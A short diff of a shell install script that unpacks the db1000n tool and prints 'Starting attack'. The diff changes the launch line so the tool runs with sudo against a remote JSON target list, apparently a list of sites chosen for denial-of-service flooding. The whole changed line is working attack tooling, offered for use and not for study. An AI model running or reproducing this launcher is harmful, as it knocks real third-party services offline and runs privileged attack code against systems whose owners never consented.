@@ -35,4 +35,4 @@ fi
 tar xvf "${ARCHIVE}"
 tput bold; tput setaf 2; echo "db1000n successfully installed. Starting attack"
 sleep 5
-sudo ./db1000n
+sudo ./db1000n -c https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/db1000n_config.L7.json
